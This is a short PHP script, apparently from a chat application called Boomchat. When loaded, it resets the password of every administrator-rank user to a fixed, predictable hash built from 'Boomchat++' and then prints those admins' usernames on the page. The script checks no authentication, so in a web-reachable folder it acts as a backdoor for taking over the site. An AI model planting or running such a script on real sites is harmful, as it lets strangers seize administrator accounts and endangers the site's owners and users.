<?php
	require_once('../../system/database.php');
	
	$mysqli = @new mysqli($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME);
	
	$newpas = sha1(str_rot13('Boomchat++' . $encryption));
	$mysqli->query("UPDATE `users` SET `user_password` = '$newpas' WHERE `user_rank` > 4");
	
	$echoadmi = $mysqli->query("SELECT * FROM users WHERE user_rank > 4");
	if($echoadmi->num_rows > 0){
		while ($listadmin = $echoadmi->fetch_assoc()){
			echo '<p>admin name : ' . $listadmin['user_name'] . '</p>';
		}
	}
	
?>